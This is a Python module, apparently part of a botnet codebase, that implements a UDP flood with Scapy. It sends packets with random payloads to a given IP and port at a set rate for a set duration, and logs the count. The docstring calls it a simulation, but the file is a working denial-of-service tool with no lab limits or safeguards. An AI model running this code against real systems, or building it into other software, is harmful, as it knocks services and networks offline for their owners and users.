"""UDP flood attack simulation using Scapy."""

from __future__ import annotations

import logging
import os
import random
import time
from typing import Optional

from scapy.all import IP, UDP, Raw, send

LOG_FORMAT = "[%(asctime)s][%(name)s][%(levelname)s] %(message)s"
DATE_FORMAT = "%Y-%m-%dT%H:%M:%S"
LOGGER = logging.getLogger("botnet.udp_flood")


def configure_logging() -> None:
    """Configure module logging.

    Args:
        None.

    Returns:
        None.
    """
    logging.basicConfig(level=os.getenv("LOG_LEVEL", "INFO"), format=LOG_FORMAT, datefmt=DATE_FORMAT)


def run_udp_flood(target_ip: str, duration_seconds: int, packet_rate: int, target_port: int = 80) -> int:
    """Send a UDP flood stream to the target.

    Args:
        target_ip: Destination IP address.
        duration_seconds: Duration of the attack.
        packet_rate: Packets per second.
        target_port: Destination UDP port.

    Returns:
        Total packets transmitted.
    """
    end_time = time.time() + duration_seconds
    total_packets = 0
    while time.time() < end_time:
        packets = []
        for _ in range(max(1, packet_rate)):
            payload = os.urandom(random.randint(32, 128))
            packets.append(IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=payload))
        send(packets, verbose=False)
        total_packets += len(packets)
        time.sleep(1)
    LOGGER.info("UDP flood finished: %s packets sent to %s", total_packets, target_ip)
    return total_packets
